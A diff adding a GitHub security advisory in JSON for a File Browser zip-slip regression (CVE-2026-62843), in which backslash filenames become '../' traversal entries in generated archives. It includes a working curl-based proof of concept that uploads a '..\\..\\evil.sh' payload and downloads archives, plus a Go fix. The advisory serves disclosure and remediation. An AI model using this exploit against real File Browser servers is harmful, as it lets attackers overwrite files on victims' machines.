@@ -1,0 +1,58 @@
+{
+  "id": "GHSA-83xp-526h-j3ww",
+  "modified": "2026-07-20T22:30:24.161562969Z",
+  "published": "2026-07-20T22:16:09Z",
+  "aliases": [
+    "CVE-2026-62843"
+  ],
+  "summary": "File Browser: Archive builder turns backslash filenames into path traversal (zip-slip)",
+  "details": "## Summary\n\nThe fix for `GHSA-gxjx-7m74-hcq8` / `CVE-2026-54093` (shipped in v2.63.6) added a `strings.ReplaceAll(nameInArchive, \"\\\\\", \"/\")` step to the archive builder; this was the advisory's recommended \"Primary Fix.\" On a Linux host a backslash is a legal, non-separator filename character, so replacing it with the real POSIX separator `/` **manufactures** a `/`-delimited traversal sequence out of a benign single file name. The fix neutralized the Windows-only vector but reintroduced the same class of bug on POSIX systems, and the advisory's \"Secondary Mitigation\" (reject backslash filenames at creation time) was never implemented, so the malicious file can still be planted.\n\nA file named `..\\..\\evil.sh`, one ordinary regular file on a Linux server, is emitted into generated zip/tar archives as the entry `../../evil.sh`. Any user with upload (Create) permission can plant such a file; when anyone later downloads the containing folder as an archive and extracts it, the entry escapes the extraction directory on the victim's machine. The original advisory's own payload `..\\..\\..\\Windows\\System32\\evil.txt` now becomes `../../../Windows/System32/evil.txt`, which, unlike before the fix, also traverses on Linux and macOS extractors. The fix turned a Windows-only zip-slip into a cross-platform one.\n\n## Details\n\n**1. The archive builder rewrites backslashes into path separators (`http/raw.go:133`)**\n\n```go\nnameInArchive := strings.TrimPrefix(path, commonPath)\nnameInArchive = strings.TrimPrefix(nameInArchive, string(filepath.Separator))\nnameInArchive = filepath.ToSlash(nameInArchive)        // line 127, host separator only\n// ... comment explaining the intent to strip Windows separators ...\nnameInArchive = strings.ReplaceAll(nameInArchive, \"\\\\\", \"/\")   // line 133, creates traversal\n```\n\n`filepath.ToSlash` only rewrites the host separator, so on Linux a stored backslash survives until this explicit `ReplaceAll`. Replacing `\\` with the real separator `/` produces traversal rather than neutralizing it.\n\n**2. The rewritten name is used verbatim as the archive entry path (`http/raw.go:137`)**\n\n```go\narchiveFiles = append(archiveFiles, archives.FileInfo{\n    FileInfo:      info,\n    NameInArchive: nameInArchive,   // no path.Clean, no \"..\" rejection\n    Open:          func() (fs.File, error) { return d.user.Fs.Open(path) },\n})\n```\n\nThe value is handed to the archiver, which writes the entry under exactly that name. There is no `path.Clean`, no rejection of `..` segments, and no check that the entry stays within the archive root.\n\n**3. The malicious name is plantable through normal upload (`http/resource.go`, `resourcePostHandler`)**\n\nA backslash is a valid byte in a Linux filename, so `..\\..\\evil.sh` is a single regular file inside the user's scope, it does not traverse on the server and passes the scope guard. `resourcePostHandler` derives the filename from `r.URL.Path` and cleans it with `path.Clean(\"/\" + ...)`, which only treats `/` as a separator; the URL-encoded segment `..%5C..%5Cevil.sh` contains no `/`, so cleaning leaves it intact and the file is written verbatim. This is the \"Secondary Mitigation\" the parent advisory recommended but that was never implemented; backslash-containing filenames are still accepted at creation time.\n\n**4. Every archive format shares the sink**\n\n`NameInArchive` is the single shared field for all `algo` values (`zip`, `tar`, `targz`, …), so the traversal entry appears identically in every supported archive type.\n\n## PoC\n\nTested against `filebrowser/filebrowser:v2.63.15`.\n\n**Attack Vector: plant a backslash-named file via upload, then download the folder as an archive:**\n\n```bash\n#1. Create a dir in /tmp and start a fresh v2.63.15 container\nmkdir -p /tmp/filebrowser-test/srv\ndocker run -d --name filebrowser-test -p 8090:80 -v /tmp/filebrowser-test/srv:/srv filebrowser/filebrowser:v2.63.15 \u0026\u0026 sleep 4\nB=http://localhost:8090\n\n#2. Log in (admin here, but any account with Create permission works)\nAP=$(docker logs filebrowser-test 2\u003e\u00261 | grep -o 'password: .*' | awk '{print $2}')\nT=$(curl -s -X POST $B/api/login -H 'Content-Type: application/json' -d \"{\\\"username\\\":\\\"admin\\\",\\\"password\\\":\\\"$AP\\\"}\")\n\n#3. Create the folder ziptest/\ncurl -s -X POST \"$B/api/resources/ziptest/\" -H \"X-Auth: $T\" -o /dev/null\n\n#4. Upload one file whose name contains backslashes (a single legal Linux filename inside scope; does not traverse on the server)\ncurl -s -X POST \"$B/api/resources/ziptest/..%5C..%5Cevil.sh?override=true\" -H \"X-Auth: $T\" \\\n     --data-binary $'#!/bin/sh\\necho PWNED' -o /dev/null\n\n#5. Download the folder as a zip and as a targz\ncurl -s \"$B/api/raw/ziptest?algo=zip\"   -H \"X-Auth: $T\" -o out.zip\ncurl -s \"$B/api/raw/ziptest?algo=targz\" -H \"X-Auth: $T\" -o out.tar.gz\n\n#6. Inspect the archive entry names: the backslash-\u003eslash rewrite turned ..\\..\\evil.sh into ../../evil.sh\npython3 -c \"import zipfile;print('ZIP:',zipfile.ZipFile('out.zip').namelist())\"\npython3 -c \"import tarfile;print('TAR:',[m.name for m in tarfile.open('out.tar.gz').getmembers()])\"\n```\n\nExpected output (reproduced on a fresh `filebrowser-test` container, v2.63.15):\n\n```http\nPOST /api/resources/ziptest/..%5C..%5Cevil.sh?override=true  -\u003e 200   (stored on disk as the single file  ..\\..\\evil.sh)\nGET  /api/raw/ziptest?algo=zip                               -\u003e 200   (zip bytes)\nGET  /api/raw/ziptest?algo=targz                             -\u003e 200   (gzip bytes)\n```\n\nThe archive entry names, the value the reader should check, come back as the traversal path manufactured from the backslashes:\n\n```\nZIP: ['../../evil.sh']\nTAR: ['../../evil.sh']\n```\n\nExtracting either archive with a permissive extractor writes `evil.sh` two directories above the intended target, outside the extraction folder.\n\n## Impact\n\n- **Zip-slip / tar-slip on the victim host:** extracting a downloaded archive writes the planted file to an attacker-chosen relative path outside the extraction directory, enabling overwrite of configuration, startup scripts, or other files, potentially leading to code execution depending on what is overwritten.\n- **Who is affected:** any party who downloads a folder-as-archive containing the planted file, the folder owner, a collaborator, an admin performing a backup, or a recipient of a shared/public link to the folder.\n- **Regression that widened the blast radius:** before this rewrite, `..\\..\\evil.sh` only traversed on Windows extractors; afterwards the entry is `../../evil.sh` and traverses on Linux and macOS extractors as well.\n- **Low attacker bar:** only Create permission (the default for normal users) is needed to plant the file; the traversal triggers on the victim's extraction step.\n\n## Recommended Fix\n\nThe current `ReplaceAll(nameInArchive, \"\\\\\", \"/\")` is the root cause and should be removed: replacing a backslash with the POSIX separator `/` creates the very traversal it is meant to prevent. Neutralize backslashes instead, and reject traversal in archive entry names:\n\n```go\n// http/raw.go, getFiles, replace the backslash-\u003eslash rewrite:\nnameInArchive = strings.ReplaceAll(nameInArchive, \"\\\\\", \"_\") // neutralize, do not separate\n\n// And reject any residual traversal before adding the entry:\nclean := path.Clean(\"/\" + nameInArchive)\nif strings.Contains(nameInArchive, \"..\") || clean != \"/\"+nameInArchive {\n    return nil, fmt.Errorf(\"unsafe archive entry name: %q\", nameInArchive)\n}\n```\n\nAdditionally, implement the \"Secondary Mitigation\" recommended in `GHSA-gxjx-7m74-hcq8` but never shipped: reject or sanitize filenames containing backslashes at creation time in `http/resource.go` (`resourcePostHandler`), so backslash-containing names can never be stored in the first place. Defending only at archive-build time is fragile; defending at both creation and archive-build time closes the class.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/filebrowser/filebrowser/v2",
+        "purl": "pkg:golang/github.com/filebrowser/filebrowser/v2"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "2.63.6"
+            },
+            {
+              "fixed": "2.63.17"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 2.63.16",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-83xp-526h-j3ww/GHSA-83xp-526h-j3ww.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/filebrowser/filebrowser/security/advisories/GHSA-83xp-526h-j3ww"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-62843"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/filebrowser/filebrowser/commit/8503ba61ff51d48a7313896483d130eb6a5abfe0"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/filebrowser/filebrowser"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/filebrowser/filebrowser/releases/tag/v2.63.17"
+    }
+  ]
+}
